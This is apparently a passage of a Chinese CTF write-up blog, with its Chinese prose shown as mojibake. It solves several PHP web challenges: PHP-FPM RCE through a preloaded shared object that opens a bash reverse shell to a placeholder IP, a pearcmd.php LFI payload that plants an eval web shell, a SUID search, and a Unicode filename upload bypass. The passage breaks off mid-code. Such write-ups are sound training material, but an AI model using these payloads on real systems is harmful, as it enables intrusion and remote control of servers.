<h4 id="0x01-ç®€å•çš„æº¢å‡º"><a href="#0x01-ç®€å•çš„æº¢å‡º" class="headerlink" title="0x01:ç®€å•çš„æº¢å‡º"></a>0x01:ç®€å•çš„æº¢å‡º</h4><p>ç›´æ¥pocï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;count = <span class="number">9223372036854775806</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User();</span><br><span class="line">var_dump(urlencode(serialize(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<p>çœ‹phpinfoï¼Œå¯ä»¥å‘ç°å¾ˆå¤šå‡½æ•°éƒ½ä¸èƒ½ç”¨ï¼Œå¹¶ä¸”open_basedirä¹Ÿé™åˆ¶äº†åœ¨<code>/var/www/html</code>ã€‚å†™ä¸€å¥è¯ç”¨èšå‰‘é“¾å‘ç°å‡ ä¹ä»€ä¹ˆéƒ½åšä¸äº†ï¼Œå› ä¸ºæ’ä»¶æ²¡å¼„å¥½æ²¡æ³•ç»•è¿‡<code>open_basedir</code></p>
<p><img src="https://img-blog.csdnimg.cn/da276cf62d3f4437ad038d72ae75b8f4.png" alt="image-20220621145959690"></p>
<h4 id="0x02-å›°éš¾çš„FPMæœªæˆæƒRCE"><a href="#0x02-å›°éš¾çš„FPMæœªæˆæƒRCE" class="headerlink" title="0x02:å›°éš¾çš„FPMæœªæˆæƒRCE"></a>0x02:å›°éš¾çš„FPMæœªæˆæƒRCE</h4><h5 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h5><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™</a></p>
<p>FastCGIå…¶å®æ˜¯ä¸€ä¸ªé€šä¿¡åè®®ï¼Œå’ŒHTTPåè®®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“ã€‚Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚</p>
<h5 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h5><p>FPMå…¶å®æ˜¯ä¸€ä¸ªfastcgiåè®®è§£æå™¨ï¼ŒNginxç­‰æœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™è°ï¼Ÿå…¶å®å°±æ˜¯ä¼ ç»™FPMã€‚</p>
<p>FPMæŒ‰ç…§fastcgiçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚</p>
<h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/your_IP/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘æˆsoæ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared shell.c -o shell.so</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸Šä¼ åˆ°htmlç›®å½•ä¸‹ </p>
<p>åœ¨è‡ªå·±çš„vpsä¸Šå¼€å¯ä¸€ä¸ªæ¶æ„çš„ftpæœåŠ¡å¹¶åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç”¨äºåˆ©ç”¨fastcgiè®¿é—®è¯¥ftpæœåŠ¡ä½¿å¾—soæ–‡ä»¶æ‰§è¡ŒæˆåŠŸåå¼¹shell</p>
<p>ftpæœåŠ¡ä»£ç ä»¥åŠfastcgi expéƒ½æ¥è‡ªReferenceï¼Œæ„Ÿè°¢å¤§å¸ˆå‚… æˆ‘è¿™é‡Œå°±ä¸è´´äº†ğŸ¥º</p>
<p>å¼€å¯ftpæœåŠ¡</p>
<p><img src="https://img-blog.csdnimg.cn/ffb80af2b5d440128ee3faceb9c4ac70.png" alt="image-20220621161055962"></p>
<p>ç›‘å¬2333ç«¯å£ï¼Œåœ¨<code>file.php</code>æ–‡ä»¶ä¸‹æ‰“payload</p>
<p><img src="https://img-blog.csdnimg.cn/b592a2a086f6469c975a4ed0b96ae5e1.png" alt="image-20220621161202159"></p>
<p>ä½†æ˜¯æ²¡æœ‰æƒé™ï¼Œéœ€è¦ææƒï¼ŒSUID</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/d954430e4f4842b9b6d4069966f7e39a.png" alt="image-20220621161831190"></p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpæ‰§è¡Œï¼Œå› ä¸ºphpæ˜¯ä»¥rootçš„æƒé™ä½¿ç”¨çš„æ‰€ä»¥æ˜¯å¯ä»¥è·å–åˆ°flagçš„å†…å®¹çš„ï¼Œæ‰€ä»¥åªè¦ç»•è¿‡<code>open_basedir</code>å°±å¥½äº†ï¼Œä¹‹å‰æ•´ç†è¿‡å°±ç›´æ¥ç”¨äº†</p>
<p><img src="https://img-blog.csdnimg.cn/7f591661c4364e359e5b26d53bde5a79.png" alt="image-20220621162157303"></p>
<h2 id="HXBCTF-2021-easywill"><a href="#HXBCTF-2021-easywill" class="headerlink" title="[HXBCTF 2021]easywill"></a>[HXBCTF 2021]easywill</h2><h4 id="0x01-ç®€å•çš„é“¾å­"><a href="#0x01-ç®€å•çš„é“¾å­" class="headerlink" title="0x01:ç®€å•çš„é“¾å­"></a>0x01:ç®€å•çš„é“¾å­</h4><p>ä¸€æ‰“å¼€é¶åœºå°±ç»™äº†ä¸€éƒ¨åˆ†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">home</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        assign(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> view();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å»ç½‘ç»œä¸ŠæŠŠ<a href="https://www.abnma.com/12216.html">willphp2.1.5</a>ä¸‹ä¸‹æ¥äº†ï¼Œçœ‹è¿™ä¸ª<code>IndexController</code>å°±çŸ¥é“æˆ‘ä»¬ç°åœ¨å¤„äºè¿™ä¸ªä½ç½®ï¼Œç„¶åä¼ ä¸¤ä¸ªå€¼ç„¶åæ‰§è¡Œ<code>assign</code>å’Œ<code>view</code>å‡½æ•°ï¼Œæ‰€ä»¥è¯¥æ€ä¹ˆåˆ©ç”¨å°±è¦å…ˆå»å®¡è®¡ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°</p>
<p><code>assign</code>ç®€å•çš„èµ‹å€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span> = <span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="string">&#x27;&#x27;</span>) <span class="built_in">self</span>::<span class="variable">$_vars</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><code>view</code>å®é™…è°ƒç”¨çš„æ˜¯<code>fetch</code></p>
<p><img src="https://img-blog.csdnimg.cn/b052b8d78e924187bd51b259b045ce3a.png" alt="image-20220621164534163"></p>
<p><code>fetch()</code>è¿™é‡Œå¹¶æ²¡æœ‰ç‰¹åˆ«çš„ç‚¹ï¼Œç›´æ¥çœ‹æœ€åä¸€ä¸ª<code>render</code>ï¼Œæ¸²æŸ“ï¼Œä¸€èˆ¬å°±ä¼šåœ¨æ¸²æŸ“çš„æ—¶å€™å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$vars</span> = []</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$vars</span>)) <span class="built_in">self</span>::<span class="variable">$_vars</span> = array_merge(<span class="built_in">self</span>::<span class="variable">$_vars</span>, <span class="variable">$vars</span>);    <span class="comment">// varsä¸ºç©º      </span></span><br><span class="line">   define(<span class="string">&#x27;__THEME__&#x27;</span>, C(<span class="string">&#x27;theme&#x27;</span>));</span><br><span class="line">   define(<span class="string">&#x27;VPATH&#x27;</span>, (THEME_ON)? PATH_VIEW.<span class="string">&#x27;/&#x27;</span>.__THEME__ : PATH_VIEW);  </span><br><span class="line">   <span class="variable">$path</span> = __MODULE__;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$file</span> == <span class="string">&#x27;&#x27;</span>) &#123; <span class="comment">// ä¸ºç©º</span></span><br><span class="line">      <span class="variable">$file</span> = __ACTION__;</span><br><span class="line">   &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$file</span>, <span class="string">&#x27;:&#x27;</span>)) &#123;</span><br><span class="line">      <span class="keyword">list</span>(<span class="variable">$path</span>,<span class="variable">$file</span>) = explode(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line">   &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$file</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">      <span class="variable">$path</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$path</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable">$vfile</span> = VPATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$path</span> = strtolower(<span class="variable">$path</span>);</span><br><span class="line">      <span class="variable">$vfile</span> = VPATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">if</span> (!file_exists(<span class="variable">$vfile</span>)) &#123;</span><br><span class="line">      App::halt(<span class="variable">$file</span>.<span class="string">&#x27; æ¨¡æ¿æ–‡ä»¶ä¸å­˜åœ¨ã€‚&#x27;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      define(<span class="string">&#x27;__RUNTIME__&#x27;</span>, App::getRuntime());  </span><br><span class="line">      array_walk_recursive(<span class="built_in">self</span>::<span class="variable">$_vars</span>, <span class="string">&#x27;self::_parse_vars&#x27;</span>); <span class="comment">//å¤„ç†è¾“å‡º</span></span><br><span class="line">      \Tple::render(<span class="variable">$vfile</span>, <span class="built_in">self</span>::<span class="variable">$_vars</span>); <span class="comment">// è¿›è¡Œæ¸²æŸ“</span></span><br><span class="line">   &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>render</code>è¿™é‡Œä¼šå¯¹<code>$_vars</code>è¿›è¡Œæ“ä½œçš„ä¹Ÿå°±åªæœ‰<code>renderTo</code>ï¼Œç›´æ¥è·Ÿè¿›<code>renderTo</code>ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æœ€åä¼šå¯¹<code>_vars</code>è¿›è¡Œ<code>extract</code>ç›´æ¥å®ç°äº†å˜é‡è¦†ç›–äº†è¯´æ˜æˆ‘ä»¬ä¼ è¿›å»çš„æœ‰<code>name=cfile</code>ï¼Œè€ŒåŒ…å«æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$vfile</span>, <span class="variable">$_vars</span> = []</span>) </span>&#123;</span><br><span class="line">   <span class="variable">$shtml_open</span> = C(<span class="string">&#x27;shtml_open&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$shtml_open</span> || basename(<span class="variable">$vfile</span>) == <span class="string">&#x27;jump.shtml&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">self</span>::renderTo(<span class="variable">$vfile</span>, <span class="variable">$_vars</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      â€¦â€¦</span><br><span class="line">      <span class="keyword">if</span> (is_file(<span class="variable">$sfile</span>) &amp;&amp; filemtime(<span class="variable">$sfile</span>) &gt; (<span class="variable">$ntime</span> - <span class="variable">$shtml_time</span>)) &#123;</span><br><span class="line">         <span class="keyword">include</span> <span class="variable">$sfile</span>;             </span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         ob_start();</span><br><span class="line">         <span class="built_in">self</span>::renderTo(<span class="variable">$vfile</span>, <span class="variable">$_vars</span>);</span><br><span class="line">         <span class="variable">$content</span> = ob_get_contents();</span><br><span class="line">         file_put_contents(<span class="variable">$sfile</span>, <span class="variable">$content</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTo</span>(<span class="params"><span class="variable">$vfile</span>, <span class="variable">$_vars</span> = []</span>) </span>&#123;</span><br><span class="line">   <span class="variable">$m</span> = strtolower(__MODULE__);</span><br><span class="line">   <span class="variable">$cfile</span> = <span class="string">&#x27;view-&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;_&#x27;</span>.basename(<span class="variable">$vfile</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span> (basename(<span class="variable">$vfile</span>) == <span class="string">&#x27;jump.html&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable">$cfile</span> = <span class="string">&#x27;view-jump.html.php&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$cfile</span> = PATH_VIEWC.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$cfile</span>;</span><br><span class="line">   <span class="keyword">if</span> (APP_DEBUG || !file_exists(<span class="variable">$cfile</span>) || filemtime(<span class="variable">$cfile</span>) &lt; filemtime(<span class="variable">$vfile</span>)) &#123;</span><br><span class="line">      <span class="variable">$strs</span> = <span class="built_in">self</span>::comp(file_get_contents(<span class="variable">$vfile</span>), <span class="variable">$_vars</span>);</span><br><span class="line">      file_put_contents(<span class="variable">$cfile</span>, <span class="variable">$strs</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   extract(<span class="variable">$_vars</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="variable">$cfile</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<h4 id="0x02-å›°éš¾çš„LFI"><a href="#0x02-å›°éš¾çš„LFI" class="headerlink" title="0x02:å›°éš¾çš„LFI"></a>0x02:å›°éš¾çš„LFI</h4><p><a href="https://blog.csdn.net/rfrder/article/details/121042290">https://blog.csdn.net/rfrder/article/details/121042290</a></p>
<p>ç›´æ¥ç”¨å¸ˆå‚…çš„payloadæ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ameuu.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/01a38fa88ccd451fa5accc3a39b7dc67.png" alt="image-20220621170201968"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=cfile&amp;value=/tmp/ameuu.php</span><br></pre></td></tr></table></figure>

<p>phpinfoé‡Œé¢ä»€ä¹ˆéƒ½æ²¡æœ‰banï¼Œç›´æ¥systemå°±å¥½äº†</p>
<p><img src="https://img-blog.csdnimg.cn/265e822139d24bb0a6605d0463219b83.png" alt="image-20220621170228083"></p>
<h2 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h2><p><code>upload.php</code>è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¼šè·å–å›¾ç‰‡çš„å¤§å°ä»¥åŠåå­—æ¥åˆ¤æ–­æ˜¯å¦ä¸ºå›¾ç‰‡ä»¥åŠå¯¹æ–‡ä»¶åè¿›è¡Œäº†é»‘åå•è¿‡æ»¤</p>
<p>è¦æ±‚å›¾ç‰‡çš„widthå’Œheightéƒ½ä¸º1å¯ä»¥åˆ©ç”¨<code>#define width 1</code>ç»•è¿‡</p>
<p>è€Œæ–‡ä»¶åçš„ç»•è¿‡ï¼Œç”±äº<code>urldecode</code>æ˜¯åœ¨åˆ¤æ–­ä¹‹å‰ç”¨çš„ï¼Œæ‰€ä»¥ä¸èƒ½åˆ©ç”¨urläºŒæ¬¡ç¼–ç ç»•è¿‡ï¼Œä½†æ˜¯çœ‹<code>imagePath</code>çš„æ—¶å€™å‘ç°å¯¹æ–‡ä»¶åè¿›è¡Œäº†<code>mb_sretolower</code>æ“ä½œï¼Œè¿™ä¸å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç»•è¿‡å˜›</p>
<p>å¯ä»¥åˆ©ç”¨<a href="https://unicode-table.com/cn/blocks/latin-extended-a/">unicode</a><code>Ä°</code></p>
<p><img src="https://img-blog.csdnimg.cn/6f3355b2a7dd45dcaad7681108f30fc6.png" alt="image-20220622103403948"></p>
<p>å› ä¸ºæ˜¯æ‹‰ä¸æ–‡ï¼Œç›´æ¥æ”¾ä¸Šå»çš„è¯ä¸ä¼šè¯†åˆ«å‡ºæ¥ï¼Œå¯ä»¥urlç¼–ç ä¸€ä¸‹<code>%C4%B0</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»ç½‘ä¸Šæ‰¾ä¸ªè„šæœ¬åˆ¶ä½œå›¾ç‰‡é©¬ï¼ˆä¹Ÿå¯ä»¥åˆ©ç”¨å·¥å…·å°±æ˜¯äº†</p>
<p>æ­ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œç„¶åæŠŠactionä¿®æ”¹ä¸º<code>http://xxxx/upload.php</code>ï¼Œå…¶ä»–ä¿¡æ¯ä¹Ÿè¦æ ¹æ®æºç ç»™çš„ä¿®æ”¹ï¼Œä¸Šä¼ ï¼</p>
<p><img src="https://img-blog.csdnimg.cn/ad6cfe436aa34e25a40ed523bb14a88a.png" alt="image-20220622103839769"></p>
<p><code>example.php</code>ä¸­å¯ä»¥å¯¹å‹ç¼©æ–‡ä»¶è¿›è¡Œè§£å‹ï¼Œå¹¶ä¸”è¿˜ä¼šå°†è§£å‹åçš„æ–‡ä»¶äºŒæ¬¡æ¸²æŸ“æ”¾åˆ°<code>example/</code>ç›®å½•ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))-<span class="number">1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        